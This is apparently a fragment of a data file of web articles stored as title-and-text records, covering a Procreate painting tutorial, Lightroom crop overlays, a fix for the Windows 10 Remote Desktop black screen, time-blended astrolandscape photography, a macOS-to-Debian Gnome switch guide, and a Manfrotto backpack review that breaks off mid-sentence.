Big Chunky Lead brush to fill in the shapes I'd drawn on a New Layer . This way, I can save my sketch, but still use it as a guideline. \nI like to isolate different pieces of my colors on separate layers, for organization purposes. \nStep 3 \nHowever, some features, like the general placement of the facial features, were covered up by my initial, flat colors. So I lowered the opacity on my flat colors so that I could, again, refer to my initial sketch. \nStep 4 \nThis allowed me to put down a more refined version of the facial features. I tried out Frankie & Bonnie's Pencil from this Procreate brush set for this part! \nStep 5 \nAt this point, I started to refine my work. I created a New Layer and refined the shapes until I came up with something I was happy with\u2014added some more hair, adjusted the shape of the face. \nI found these brushes to feel very organic and easy to work with. It felt very much like working with real media\u2014but with the benefit of layers and undo! \nStep 6 \nI added a rough background using Big 4B Lead , one of the larger brushes in this Procreate brush set. \nStep 7 \nNow, time to experiment with some lighting! I decided to add a shadow on the right-hand side, and I settled on a blue-ish color. I used the Big Chunky Lead brush! \nI did this on a New Layer with the Blending Mode set to Multiply . This way, the blue affects my flat colors. \nStep 8 \nThen, I wanted some light on the opposite side. I decided on a yellowish color. \nAgain, I did this on a New Layer . Sussie B's Pencil was a great fit for this one, at a larger brush size. \nStep 9 \nI added a little reflected light on the right-hand side, again using the Big Chunky Lead brush. \nI like to use the Eyedropper Tool to lift surrounding colors and paint on top of my work\u2014as I did here with the fluffy, afro hair. I found Soft Pencil Lead to be a nice brush for blending, and Sussie B's Brush works well, at larger sizes, for harder lines. \nStep 10 \nI decided to change up the background, to better work with the colors I was experimenting with\u2014a cool blue on the right, yellow on the left. Big Flat Lead was a great choice for this. I really enjoyed how easily these brushes blend. \nI also added some subtle light to the facial area using Sussie B's Pencil \u2014can you tell I'm really fond of that one, in particular? \nStep 11 \nI added some stars in the background. They're rough little pencil marks\u2014just placed about for an extra touch of night sky. I tried out Trisha's Pencil for this one! \nStep 12 \nWhen I was happy with my work, I flattened the character art and cleaned it up with the eraser. I decided I wanted to keep things relatively relaxed and textured, but there were a few places I thought just needed a little tidying up! \nAnd There You Have It! \nThanks so much for exploring how to install and use Procreate brushes with me! I had a lot of fun with this demonstration\u2014and honestly, I'm excited to use this brush set again! It was really user-friendly and fun to use. \nGood luck with your creative projects, and happy drawing! \nIf you'd like to follow the process of this illustration, it's available on the Envato Tuts+ YouTube channel : \nIf you enjoyed working with this Procreate Brush, here are some others to check out and experiment with! \nOil Paint Brushes for Procreate \nThese Procreate Brushes are a lovely addition to any collection, especially if you're a fan of texture! They're by the same author as the artist who made the brushes we experimented with in this tutorial, too! \nShader Brushes for Procreate \nI absolutely love the texture in these Procreate shader brushes.

      "title": "The Best Lightroom Tool For Improving Composition in Photos",
      "text": "How many times have you returned from what you felt was a productive photography trip only to find that some of the compositions of your favorite images weren\u2019t exactly what you expected? This happens to me rather frequently, but fortunately for us, we have access to one of the best Lightroom tools for improving composition in our photos: the Crop tool! \nIn this 15 minute video, we discuss not only the crop tool but perhaps the greatest aspect related to the Crop tool within Lightroom, and that\u2019s the Crop Overlays. \nFor years I only used the crop tool as a means of cleaning up the edges of my images by removing overlooked distractions. But, when the crop tool is used most effectively, it\u2019s as if you\u2019ve accessed a time machine that enables you to go back and recompose your composition to something that\u2019s more pleasing. \nIn order to access the crop overlays within Lightroom, open the Crop tool and simply press the shortcut key O to cycle through the various crop overlays. There\u2019s a total of 7 available, but I typically only use 5 of them. \nRule of Thirds \nThis is perhaps one of the more common compositional techniques used today. The rule of thirds overlay divides your image into equal thirds. It\u2019s great for ensuring that you don\u2019t place your subject in the dead center of the frame and also assists you when it comes to the placement of the horizon. The basic premise here is to place areas of visual interest on the intersecting points of the grid. \nDiagonal \nThis crop overlay is fantastic for images that have diagonal qualities associated with it. This technique will apply multiple 45-degree lines from the corners and is helpful for aligning diagonal subjects within your photograph. \nTriangle \nThis approach really helped me with one of my favorite images of 2019 (above). This crop overlay resembles a series of triangles flipped in multiple directions. If you press Shift + O , you can flip the entire grid in the opposite orientation. The purpose here is to place points of interest within each of the separate triangles. \nGolden Ratio \nThis overlay is considered to be a more advanced version of the rule of thirds, but with additional emphasis placed on the corners. The overall premise, however, remains the same: place areas of interest on or near the intersecting points. \nGolden Spiral \nThis is perhaps the most interesting one of them all, the golden spiral. This is another overlay that you can flip by pressing Shift + O . This works well for images that have sweeping aspects to the composition with the end result being the main point of emphasis placed towards the area of converging lines. \nThe two remaining crop overlays are \u2018Aspect Ratios\u2019 and another simply called \u2018Grid\u2019. It\u2019s also important to note that these overlays are only meant to be applied as guidelines or suggestions and shouldn\u2019t be taken too literally, but once you begin using them I\u2019m sure you\u2019ll find that they\u2019re a great way to gain some additional compositional creativity. \nP.S.

      "text": "After upgrading Windows to the latest version which is released recently Windows 10 May update 2019, many users face any kind of issues. Windows 10 Remote desktop app helps you to connect to another computer over an internet connection or local network. This Remote desktop app can be downloaded from Windows Store free of cost. \nMany users are facing the black screen with remote desktop after upgrading their computers to Windows 10 May update 2019. \nI upgraded my secondary machine from 1809 to 1903. When I access it now using Remote Desktop all I get is a black screen in the RDP windows. I then upgraded my primary machine to 1903 hoping that would help, but no. Fortunately I also have GoToAssist installed so I was able to log into the secondary machine that way and checked for updates, still no help. Finally I reverted it back to 1809 and Remote Desktop once again works. I could keep using GoToAssist but RDP over my local LAN is much faster. As long as this version as been (more or less) gold before going public, I can\u2019t possibly be the first one with this issue. It\u2019s no big deal to me that my secondary is running 1809, it\u2019s primarily a file server, but upgrading would be nice. Granted, that secondary system is an older Core2 Quad, but at 3.3GHz and 8GB of memory and a SSD, it\u2019s plenty fast enough. I suppose I could try a different video card, but it shouldn\u2019t be necessary for a feature update. Anyone have some insight into why RDP isn\u2019t working. I\u2019ve already been through all the \u201cguesses\u201d. \ud83d\ude42 \nSource: microsoft \nAdvertisement \nFix Black Screen with Remote Desktop Window 10 \nTo fix this issue, you need to update, roll back your display drivers or also check for latest chipset, BIOS/UEFI firmware drivers too. If nothing works you may also try with adjusting your computers display resolutions. Let\u2019s have a look at how to do these things to solve our Windows 10 problem. \nMethod 1: \nUpdate Display drivers \nPress ctrl+r from your keyboard to open Run command. Now type \u201c devmgmt.msc \u201d and hit Enter to open device manager. \nIn the Device Manager, Find and expand Display adapters, then right-click on your display adopter and select Update driver . If you have more than 1 adopter, then follow this step for both. \nYou can also download your display adapter\u2019s drivers from the official site. Download Display Driver for Intel \u2013 AMD \u2013 Nvidia. Just go to the official site, search for your product name and download the drivers. \nMethod 2: \nRollback Display drivers \nPress ctrl+r from your keyboard to open Run command. Now type \u201c devmgmt.msc \u201d and hit Enter to open device manager. \nIn the Device Manager, Find and expand Display adapters, then right-click on your display adopter and select Properties . In the Drivers, tab clicks on Roll Back Driver are available. \nMethod 3: \nTry old Display drivers \nLatest drivers might not be compatible with Windows 10 update; in this case, you need to try with old drivers. After doing this restart your computer and see the problem is solved or not. \nMethod 4: \nClean install Windows 10 \nClean installation of Windows 10 is the best option when you are facing the performance issue on your computer or there are other reasons too like affected by malware, apps issue, low memory, etc. In this situation, a clean installation is the best option which removes each and everything from your system drive and helps to run the system fresh.",

      "title": "How I Capture Striking Time-Blended Astrolandscapes, and You Can Too",
      "text": "My name is Paul Schmit , and today I want to describe to you the journey that led to the time-blended astrolandscape you see above. \nYou might recognize me from my recent marathon endeavor to capture the International Space Station crossing in front of the sun at sunrise . By day, I\u2019m an award-winning theoretical physicist working at the frontiers of nuclear fusion research on the world\u2019s most powerful electrical sledgehammer, the Z Machine . By night (quite literally) I\u2019m an avid astrolandscape photographer striving to push my technical skills and creativity to their limits in an effort to make my own modest contributions to a photographic community crawling with incredibly talented image makers. \nAbout a year ago, overflowing with inspiration and racking my brain trying to conjure visions of what sorts of \u201croads less traveled\u201d might be out there in the astrolandscape world, I happened upon a neat realization in my living room while playing with the Photographers Ephemeris (TPE) app. \nIt turns out that in late summer, in the midlatitudes of the Northern Hemisphere (a.k.a. my part of the world), it is possible to point an ultra-wide-angle lens toward the southwest and capture the setting sun on the right side of the frame, and then, after the last hints of daylight disappear from the horizon (a couple hours later), capture the dense, luminous core of our home galaxy, the Milky Way, moving through the left side of the frame, all without any need to reposition the camera. \nThus, a two-hour shoot from a fixed position could yield opposing perspectives of two dramatic celestial events, each casting different colors, shadows, and moods over the same patch of earth. With some clever blending in post, I reasoned, I could create an image telling two different stories simultaneously, yet inextricably linked by their common foreground. I had to try it. And, as you read on, I\u2019ll be sharing a few thoughts and tips on why I really enjoy this style, and why you might want to give it a try, too. \nThis is the image that got the ball rolling for me: Transition . \nIn September 2018, my father and I hiked across an ancient lava flow spilling across the northern New Mexico landscape in search of a foreground that would play equally well with the tones and textures of the late-day and nighttime environments. It amazed me to see such a diversity of tenacious lifeforms springing from the cracks and crevices of what was surely an apocalyptic scene eons ago. \nLate in the day, I set up my camera to immortalize a slice of this landscape, placing the setting sun on the right side of the frame. I clicked off a bracketed sequence as the sun descended beneath a fortuitously positioned late-summer storm, which cleared the area after dusk, readying the sky for a clear view of our home galaxy. Sure enough, as the sky became truly dark, the ethereal glimmer of 100 billion stars cast a dim glow across the weather-worn lava flow, appearing just to the left of where the sun had set just a couple hours earlier. \nBack at home, as I worked on constructing the final blended image, I found that the late-day clouds and lichen-adorned basalt created the sorts of pleasingly varying textures across which I could portray the night side of the image gently, perhaps even ominously creeping into the day side. My first time blend was completed. \nWhen I released this image on social media and several night photography forums, I was delighted to hear how much it resonated with so many individuals. Some fellow photographers were also keen to point out the work of Stephen Wilkes , an acclaimed photographer famous for his Day To Night\u2122 series, where he captures hundreds of images of iconic scenes over several-hour periods and then elegantly blends them into single, flowing compositions. \nSince discovering Stephen\u2019s work for myself, I have found limitless inspiration studying his style, technique, and compositional choices. He truly is the master of the blend. My hope in beginning my own foray into this genre is perhaps to more evenly emphasize the changing auras of both the terrestrial foregrounds as well as the celestial backgrounds with the passage of time, firmly planting my images within the broader astrolandscape realm. \nTip : Astrolandscape images often benefit from cleverly placed, very dim artificial light sources\u2014a technique referred to as Low Level Lighting . The goal is to provide just enough even illumination to balance the luminance of the night sky with the often darker, starlit landscape within a single exposure. \nFor Transition , I had two LED panels set atop light stands a fair distance away on either side of the camera to accentuate the textures of the lava without casting harsh shadows. The depth of the scene proved to be difficult to manage tastefully with only two lights. A better place to get started with LLL are foreground subjects with more limited depth and breadth, like a tree, a cactus, a natural arch, a cabin, etc. In these cases, one or two off-camera LED lights can be more than enough to produce a pleasing effect. \nThrilled by my first endeavor in time-blended astrolandscapes, I found myself a month later perched atop an 11,000-foot-high caldera, watching the sun descend toward the horizon as I worked out my next composition. \nOriginally, my plan was to capture the sun and the Milky Way straddling both sides of the peak of this mountain, Mt. Taylor, but the antiquated fire lookout seen on the left side of the frame was too irresistible to leave out of the composition, aptly dubbed Aerie . Improvising on the spot, I endeavored to try something new: capture the sunset and nighttime images in a panoramic mosaic, rather than a single frame. \nTime management and thoughtful anticipation of post-processing tribulations were essential here, as the ambient light and sky orientation were constantly changing during the different phases of the shoot, and the difficulty of aligning and blending two different sets of stitched images promised to be much greater than the case where the camera was fixed in place for the entire shoot. \nI quickly rattled off a few 6-vertical-panel x 7-exposure bracketed sets of images at sunset (42 images total for the day side of the image) to use for an HDR panorama. Then, as a stiff, frigid breeze enveloped the mountain peak after nightfall, I did my best to capture identical long exposures of the same 6 panels, and then quickly gathered my camera and LED lights (which were wrapped in white t-shirts at the base of the lookout to provide some dim illumination) and threw them into the back of my vehicle before the temperatures plunged further. \nTip: Perfectly aligning day and night images of the same scene can be a nontrivial task, which only gets more difficult when working with panoramas that may have stitched slightly differently. I align my images manually in Photoshop by first picking a reference image (say, the sunset image) and setting that as my background layer. Then, I\u2019ll place the other image in a new layer and use the incredibly useful Puppet Warp tool to apply minute corrections to small patches of the top layer until I no longer see signs of ghostlike duplications of prominent features in the landscape caused by imperfect overlap. \nFor identical exposures of a scene taken at only one time, the difference blending mode is a great to aid the alignment process , but with two images captured at different times and different exposure levels, I play around with other blending modes, too, such as the exclusion and divide blending modes. Reducing the top layer\u2019s opacity can also help your eye pick out misalignments of fainter features that may not be apparent at first glance. \nThis next image, While the Cranes Slept , originally wasn\u2019t supposed to be a time blend. This was the end result of a frigid but delightful all-nighter spent with my dad near the Bosque del Apache National Wildlife Refuge during the peak of the Geminids meteor shower in late 2018. \nMy goal that night was to capture two compositions that captivated my imagination, the first of which required impeccable timing and positioning, and which will be a subject of a future tutorial. With whatever time I had left before dawn, chilled to the bone by several hours of exposure to the 15-degree weather, I wanted to capture a wide-angle panorama of the winter Milky Way draped over a flock of sleeping sandhill cranes while more than a dozen meteors rained out of the sky every minute. \nWhen I arrived at one of the crane ponds and located the sleeping birds, I was disheartened to find that they had cunningly placed quite a bit of distance between themselves and the shore, preventing me from getting close enough to them to fill the whole lower part of the frame with the flock. Adjusting my composition, I spent the last 90 minutes of darkness shooting a 3-panel vertical panorama, bouncing back and forth between the three panels repeatedly to capture more meteors while the slightly annoyed cranes squawked at me from their aqueous abode. \nKnowing that they were going to turn out rather small and nearly indistinguishable in the final image\u2014a far cry from my original concept\u2014I decided to stick around until dawn to capture a second panorama. In the final image, I use the pleasant blues and purples of the early-morning sunlight to draw the viewer\u2019s eyes toward the cranes, now awakening from their slumber, blissfully ignorant to the fireworks that concluded overhead just an hour earlier. \nTip: As is the case in While the Cranes Slept , time blending can be used to accentuate or create entirely new leading lines drawing the viewer into a scene. When time and energy permit, sticking with a compelling composition and capturing it under a variety of different lighting conditions can afford entirely new creative opportunities to tell a unique story. \nThere isn\u2019t just one time an interesting astronomical alignment between the Milky Way and the sun occurs. Just as late summer affords views of sunset and the Milky Way in close proximity to one another in the Northern Hemisphere, early spring provides conveniently juxtaposed views of sunrise and our galactic core perfect for time blending. \nFor this image, Flow of Time , I wanted to use a panoramic view of the winding Rio Grande River Valley to weave together the various colors and textures of the captivating landscape under the entire palette of available ambient light, from darkness to sunrise. \nTo this day, I\u2019ve never worked harder to obtain and produce an image than I did here. \nStraddling uneven boulders forming a roughly 10-foot wide spine flanked by precipitous drops into valleys below, I struggled until the final moments of darkness trying to compose a multi-frame panorama featuring this intrepid, daredevil cholla cactus accompanied by unobstructed views of the Rio Grande, all while dealing with the growing pains of integrating a new star tracker into my workflow. \nAfter finally finding a great camera position, with my tripod jimmied up against the side of a large boulder, I spent the next couple hours capturing multiple panoramic mosaics of the night sky, the twilight \u201cblue hour,\u201d and sunrise over the distant, snow-capped Sangre de Cristo mountains. \nAligning the stitched panoramas took an incredible amount of manual labor, this time involving not two unique times to register, but three. However, having the moody blues of the early-morning twilight image to smooth the transition between day and night really enhances the fluidity of the blend. \nTip: Capturing a wide-angle landscape scene with close-by foreground subjects can stretch the limits of a lens\u2019 depth of field pretty quickly, especially when shooting nocturnal astrolandscapes at maximum aperture. \nFocus stacking has become a preferred technique to maximize depth of field under uniform lighting conditions and with static subjects; however, the same small aperture, high-f-number settings that produce brilliant sunstars can also enhance the depth of field of a sunrise/sunset landscape image, allowing sharp renderings of both nearby foreground subjects and features at infinity. In a time blend, when the composition calls for it, blending the daylight version of an image into the portions containing close-in subjects can supplant the need for focus stacking the images taken at other times. \nAnd, finally, we arrive at my latest time-blended image: Sinuous . This shot is all about mood, mood, mood. I captured this gorgeous tree near Ghost Ranch, a favorite haunt of the famed 20th-century artist, Georgia O\u2019Keefe, and one of the most scenic natural treasures that can be found in northern New Mexico. \nReally, as soon as I saw this tree, there was no escaping it. The writhing, grasping nature of its branches and fractal-like textures are a perfect setting to lose oneself between night and day. As the afternoon sun began to set, I was dismayed that the puffy white clouds that dotted the sky just an hour earlier had almost completely dissipated, robbing the sunset of some of its potential splendor. To make matters worse, the clouds came roaring back after nightfall, when outflow from distant thunderstorms intruded into my area. \nI wound up sticking around for almost an hour later than I originally anticipated, just hoping the Milky Way would peek out from behind the cloud bank before it was too late. Finally, the familiar ghostly glow of the core partially emerged, and I captured the fleeting sight. \nThis was one of those moments that seemed severely compromised by the whims of Mother Nature, so I was pleasantly surprised to return home and discover how complementary the day and night sides of the image turned out to be, with the day side conveying a sense of tranquility and grandeur, and the night side an ominous, looming atmosphere. The blowing dust that had been an annoyance at sunset wound up restoring some vibrant colors to the cloudless sky, while the clouds completely redefined the atmosphere of the night image in a manner almost better matched to my serpentine, haunting foreground. \nTip: Sometimes the composition calls for focus stacking, as was the case for Sinuous . The concept hinged on the tree living halfway between light and darkness, and I didn\u2019t have the depth of field in the night shots to capture the tree and sky in perfect focus at the same time. \nIn cases like this one, beware of focus breathing effects, even when shooting at fixed focal length. My close-up and infinity-focus night shots were about 1-2% different in scale despite not touching the zoom ring, and I had to rescale the images accordingly to produce a near-perfect blend in post. \nBonus Tip: In my year of shooting a variety of time-blended astrolandscapes, I\u2019ve come to find that the composition hinges critically on the foreground choices, no matter the convenience and spectacle of the astronomical alignments happening in the sky. In my opinion, foregrounds with lots of depth, contours, and texture variations offer the greatest opportunities to showcase the contrast in moods achieved under different lighting conditions, and they also often lend themselves to compelling blending tactics. \nIn my earlier images, Aerie and Flow of Time , I used the mountains to cast false shadows serving as the natural boundaries between day and night. Rough, jagged boulders just beg for a soft transition allowing night tones to creep toward the receding daylight; and rugged, meandering trees provide a \u201ccrackled paint\u201d sort of look, superimposing disruptive patterns across the otherwise soft, ethereal transition between daylight and darkness. \nI hope you\u2019ve enjoyed this primer on the spectacular creative opportunities that time blending can bring to astrolandscape photography, or really any other kind of artistic image making.

      "title": "My switch from macOS to Linux: Why, what I like and how you can do it too",
      "text": "After using Macs for about fifteen years, I recently switched to Linux as my main operating system and I\u2019m enjoying it. Here\u2019s an introduction to Linux that may help you if you too are looking for a change. \nWhy switch from Mac to Linux? \nWhat are Linux distros and desktop environments? \nA look into Linux Gnome desktop environment \nSo what do I like about Gnome coming from macOS? \nGnome Activities Overview is like Mission Control and Spotlight Search in one \nPreinstalled Linux applications \nGnome software center for additional apps \nFlatpak for proprietary apps \nThings you can change using Gnome settings and tweaks \nDownload a Linux ISO and give it a try on your hardware \nHow to install Linux Debian Gnome using a USB \nWhy switch from Mac to Linux? \nMy latest MacBook was four years old and was starting to feel a bit bloated and slow. It felt like a time to get a new one. \nMy previous three laptop purchases were all MacBooks but somehow this time it wasn\u2019t that tempting. I felt ready for a change, something different and something more aligned with my current needs. \nI wasn\u2019t too locked into the Apple ecosystem. I don\u2019t have an iPhone so the integrations were not necessary for me. I didn\u2019t use iCloud, FaceTime or Siri either. If all of these are key to you, switching to Linux may not be worth it. \nI used Windows before purchasing my first MacBook but returning was not in my considerations due to the state of that OS with inbuilt ads, bloat and privacy concerns. \nI\u2019ve never used Linux but the open source world is close to my heart. One of the tools I spend most of my time on for content publishing is WordPress and I love the passionate ecosystem it has. Linux seems very similar. \nMy old MacBook wasn\u2019t too compatible with Linux so I purchased a mid-range Windows machine to give Linux a try (you can even get a Linux laptop ). And I got hooked fast. \nThe idea was to take baby steps and split my time between Mac and Linux but I quickly stopped turning on my MacBook. So it got handed down and I turned to Linux full time. I\u2019ve now been running Linux exclusively for just over a year. \nWhat are Linux distros and desktop environments? \nLinux is a world of abundant choice. This can give you the freedom to do whatever you wish but it can be paralyzing to a newbie. \nLinux distros \nWhen you start learning about Linux you quickly hear all these different names that people recommend and rave about. MX, Manjaro, Mint, Ubuntu, elementary, Solus and so many more. \nThese all are Linux distributions (distros) or in other words, they are the different Linux operating systems. Linux, unlike Windows and Macs, doesn\u2019t only have one single OS. \nThere are hundreds of distros and many of them have very vocal fans explaining why such and such distro is the right one for your situation. It\u2019s amazing to have access to such a passionate community and ecosystem. \nI\u2019m here to save you some time and energy by telling you that the distro you pick doesn\u2019t matter that much. The differences are overblown, are more technical and not something you as a newbie should worry too much about. \nYou simply want to get your feet wet and start using Linux rather than worrying about which of the hundreds of options is the optimal one. \nLinux desktop environments \nA more practical difference to think about are the different desktop environments (DE) or in other words graphical user interfaces. These differ a lot in terms of aesthetics, usability, workflow and the apps they are integrated with. \nThere are many desktop environments too. You may hear people recommending KDE Plasma, XFCE, Cinnamon or window managers such as i3. \nThis means that the most important choice you have at the start of your Linux journey is to determine the desktop environment you want to try rather than what distros to run. \nA look into Linux Gnome desktop environment \nI\u2019ve tried several desktop environments (and several distros too) and in my opinion, the Linux desktop environment people coming from macOS are most likely to enjoy and feel comfortable in is Gnome. \nThere are other macOS like Linux desktop environments such as Pantheon and Deepin but Gnome is the most used one and with the most resources behind it. \nGnome is the most popular Linux desktop environment and it is the default choice in most of the big distributions such as Ubuntu, Debian and Fedora. \nThe individual distros may do some minor alterations to Gnome. The screenshots in this post are from Debian but it will look close to this in Fedora or Arch too with the only visible exceptions being the default background image and the preinstalled apps. \nHere\u2019s a look at Gnome and how it works. This is pretty much how Gnome looks like after you log in: \nSo what do I like about Gnome coming from macOS? \nIt\u2019s very clean, minimal and modern. There are no distractions. There are no desktop icons. There\u2019s no visible dock. The top panel is the only thing visible other than the background image. \nThe panel consists of \u201cActivities\u201d on the left, time and date at the center which at the same time is your notifications center and the tray icons for the network, Bluetooth, VPN, sound, brightness, battery and such on the right-hand side. \nGnome gets out of your way, it\u2019s very keyboard-centric and it just works. You\u2019ll notice some similarities with macOS such as window snapping and seeing previews of documents by hitting the space bar (exactly like Quick Look). \nGnome Activities Overview is like Mission Control and Spotlight Search in one \nDragging your mouse icon to the top left, or clicking on the \u201cActivities\u201d in the top panel or pressing the \u201cSuper key\u201d on your keyboard (Apple key or Windows key) presents you with the \u201cActivities Overview\u201d. \nActivities Overview is kind of like having the macOS Mission Control and Spotlight Search on one screen. \nActivities Overview gives you an overview of all the open applications and windows at the center. \nOn the left-hand side, you see the dock which features all your favorite applications. The dock gives you the indicator under all the open applications. \nOn the right-hand side, you see the different spaces. \nAt the top center, you see the search box. As soon as you start typing the focus is on that search box. It searches applications installed, it searches the contents of the different files you have on your computer, it does calculations and so much more. Pretty much like Spotlight. \nYou simply start typing what you\u2019re looking for and then press enter to open the application or the file. \nPreinstalled Linux applications \nYou can also see the list of all the installed applications (pretty much like Launchpad on Mac). Click on the \u201cShow Applications\u201d icon in the dock or press Super key + A. \nWhat can you expect in terms of applications available? You\u2019ll have a file manager (like Finder on a Mac), you\u2019ll have a text editor, you\u2019ll have a document viewer and you\u2019ll have a music player. \nThe default browser in most Linux distros is Firefox . The default office suite for documents, spreadsheets and presentations is LibreOffice. \nSome apps may differ from distro to distro. Debian, for instance, installs some games by default as you can see in the screenshot above. \nIn general, Linux is very lightweight and takes very little disk space compared to macOS. Unlike macOS, it\u2019s also possible to delete any of the preinstalled apps that you don\u2019t want or need. \nYou\u2019ll have access to a software center too. \nGnome software center for additional apps \nTo update the operating system or to update, delete and install applications, you use the Software Center. There are thousands of applications available in the Software Center of your Debian Gnome install. \nFor instance, there\u2019s Deja Dup which is like Time Machine and can do easy backups. \nThere\u2019s the Artha dictionary which allows you to quickly lookup words within apps the same way you can on a Mac. \nThere\u2019s GUFW which is a simple and easy to setup firewall. \nYou may be familiar with VLC from Mac already and it\u2019s one of the most popular media players on Linux too. \nFlatpak for proprietary apps \nNote that many Linux distros care about free and open-source software (see for instance Debian\u2019s Social Contract ) so if you cannot find some of your favorite closed source tools in the software center by default, I recommend you add Flatpak. \nIt\u2019s a quick process to add it to your software center. It will allow you to search for and install proprietary applications such as Spotify, Slack, Zoom, Skype, Steam and others directly from the software center. \nPro Tip: It\u2019s a good idea to double check if your must-have apps are available on Linux or if there are adequate or better alternatives. Search for options on your favorite search engine or search here for applications available in Debian by default and search here for applications you can add using Flatpak. \nThings you can change using Gnome settings and tweaks \nGnome preferences are split into two different sections. The main options are in \u201cSettings\u201d and you have some additional options in the \u201cTweaks\u201d tool. \nYou get the majority of the same options as you have on macOS. It\u2019s simple to decide what notifications get to be shown on your screen, energy saver options are pretty much equal, and it\u2019s simple to turn off things such as location services. There\u2019s also a section for keyboard shortcuts that are easy to create and edit. \nHere\u2019s a look at some of the settings you have access to such as to automatically empty trash, set the Night Light to make the screen warmer at specific points in a day and trackpad where you can enable things such as tap to click: \n\u201cTweaks\u201d tool allows you to change the look of Gnome from the default light mode to the dark mode. It also allows you to change the fonts and add any application to be launched at the startup. \nThere\u2019s also a world of Gnome extensions to add additional features and more customization options to your Gnome. There\u2019s, for instance, an extension to auto-hide the top panel when not in use. \nDownload a Linux ISO and give it a try on your hardware \nSo my advice to you coming from macOS is to explore Gnome using one of the major distributions such as Debian or Fedora . They both allow you to try it out without installing it. It\u2019s the best starting point and the best introduction to the world of Linux for a Mac user. \nSimply download the ISO image file from the official website. Here are the exact links for Fedora and Debian . Debian link is for the Debian Testing version which is what I use and recommend. Look for the debian-live-testing-amd64-gnome+nonfree.iso file on the Debian list. \nFlash the ISO image file on a USB drive using Etcher (free tool available on macOS) and boot from it to try it on your computer. \nOn a Mac, you press the \u201cOption\u201d key when the computer starts to boot using a USB. On most Windows PCs such as those from Dell, Lenovo or Acer, you press the F12 button at startup. Then you select the USB device from the boot menu. \nPro Tip: Your MacBook\u2019s hardware may not be compatible with Linux. Do try and run Linux using the USB on your hardware and see if things such as the trackpad, sound, network and webcam work before actually installing Linux. Like me, you might need to try it on a non-Apple machine. \nHow to install Linux Debian Gnome using a USB \nIf everything works well and you\u2019re happy to go all-in Linux, the installation process is quick. Here\u2019s how to install Debian Gnome: \nIn your \u201cActivities Overview\u201d, launch \u201cInstall Debian\u201d. \nThis will get you to the \u201cWelcome\u201d page of the Calamares installer for Debian. Select your language and click on the \u201cNext\u201d button. \nOn the \u201cLocation\u201d step, you can select your region and zone. \nOn the \u201cKeyboard\u201d step, you can select your keyboard model. \nOn the \u201cPartitions\u201d step, you should encrypt your new system to make it more secure. \nPro Tip: Note that by choosing the \u201cerase disk\u201d option Gnome will be installed and whatever OS you used to have on your computer will be completely removed. Do not do this unless you\u2019re sure Linux is something you want to use as your daily driver. \nOn the \u201cUsers\u201d step, you can create your user account and password. There\u2019s also the option to log in automatically without asking for a password. \nYou can now review the \u201cSummary\u201d page and if you\u2019re happy with everything and want to go ahead, click on \u201cInstall\u201d. \nThe install process will take few minutes and you will then be asked to remove your USB stick and restart your computer into the brand new world of Linux Debian Gnome. \nWhen you get more comfortable with Gnome or if you want to explore further, there\u2019s a big world of additional desktop environments and window manager opportunities out there for you. Most distros can actually run any of the desktop environments available. \nOr you may just stick to Gnome if it fits your workflow, works the way you want and does what you need. It does for me. Have fun!",

      "title": "The Manfrotto Advanced2 Hybrid Backpack is the best photography travel bag I\u2019ve ever used",
      "text": "I\u2019ve spoken about camera bags before. They\u2019re one of those things that photographers just seem to collect. Each has its purpose, but ultimately, many of them fail to live up to expectations and just end up becoming gear storage to keep the dust off your kit when it\u2019s not in use. I\u2019ve owned far too many bags for years, so new ones rarely get me excited anymore. \nRecently, though, I\u2019ve been using the new Manfrotto Advanced2 Hybrid Backpack , and it\u2019s very quickly become my favourite travel photography bag and one that I use all the time. \nThe Manfrotto Advanced2 Hybrid Backpack is part of a new range of fourteen (yes 14!) new Advanced2 bags that Manfrotto announced a little while ago. They asked if I wanted to check any of them out for myself. The logical choice to me felt like the Hybrid Backpack. It was something new, a different style of bag to those which Manfrotto had released before, and with DIYP\u2019s trip to IBC 2019 coming up, I wanted to see how it would work as my personal item on the flight and wandering around Amsterdam. \nVIDEO \nI shot the above video shortly after returning from IBC. In the time since then, I\u2019ve only come to like this bag even more. \nWhat\u2019s \u201cHybrid\u201d about it? \nSo, it\u2019s called the Hybrid Backpack. Essentially this means that it\u2019s not just a backpack, it also turns into different types of bags. It has three different \u201cforms\u201d. There\u2019s the backpack, the top handle mode for when travelling and a shoulder strap mode for every day easy access. So, it can essentially replace three completely different types of bag. \nIn top-handle mode, ideal for carrying around the airport or putting on top of a roller case \nShoulder strap mode is very handy for every day use, particularly street photography \nWho is this bag for? \nWhile it can hold some gear, this isn\u2019t a huge bag. You\u2019re not going to load it up with a whole ton of equipment like you would something like the Lowepro ProTactic BP 450 AW II . If you generally head out to a shoot with 2 or 3 camera bodies, half a dozen lenses, a couple of strobes, softboxes, etc. this probably isn\u2019t going to be the bag for you. Not if you\u2019re only carrying one bag, anyway. \nIt\u2019s primarily designed for travel photographers, lightweight assignments, or for going out for a wander while on vacation with just a camera and a few bits. But even on big shoots, this can be one of them, just holding your most important bits of kit. \nWhen I travel, it\u2019s usually to shoot, and I often take far more gear with me than I expect to use, just in case I need it. But in my downtime when I\u2019m just exploring with my camera, the Hybrid Backpack means I don\u2019t need to carry it all with me everywhere I go. It also means I don\u2019t need to carry around a big, unwieldy, mostly empty giant backpack, either. I can just grab the Hybrid. \nNormally, here, I\u2019d give a whole tour of the bag and then talk about its uses. With this one, though, I think it\u2019s better to explain my uses and show off the features as I go and how they relate to those uses. \nHow is it around the airport? \nWhat drew me to this bag the most, as mentioned was the trip to IBC 2019 . The dimensions looked pretty close to the regular backpack I\u2019d been using as my personal item when flying the last few years, but this bag is geared specifically towards photographers. \nI had a fair amount of gear to take with me to cover the show, and I wasn\u2019t sure if it would all fit inside my Lowepro PhotoStream SP200. My regular backpack would probably have worked for those extra bits, but this seemed much better suited to the task, mostly due to the fact that the back panel of the bag has a slot allowing it to slip over the handle of a roller case \u2013 which is exactly what I did. \nWhile the carry-on and personal allowances will vary from airline to airline, I took both the Lowepro PhotoStream SP200 and the Manfrotto Advanced2 Hybrid Backpack (in top handle mode) with me on the flight and had no issues flying out. When I was checking in or boarding the flight, nobody batted an eyelid at the little backpack perched on top of my carry-on roller. \nInside the Hybrid Backpack, I stored the Blackmagic Pocket Cinema Camera 4K, a few batteries, my ASUS ZenBook Pro laptop, and a change of clothes \u2013 just in case the airline decided to send my checked luggage to Peru or somewhere for a day or two. Inside the SP200 roller was everything else. A couple of Nikon DSLRs half a dozen lenses, audio gear, and a big stack of batteries to power everything. \nThe slot in the back panel of the Hybrid for the roller case handle made it a breeze to keep with me without it getting in the way, as often happens with a regular backpack. Because it\u2019s designed with this exact use in 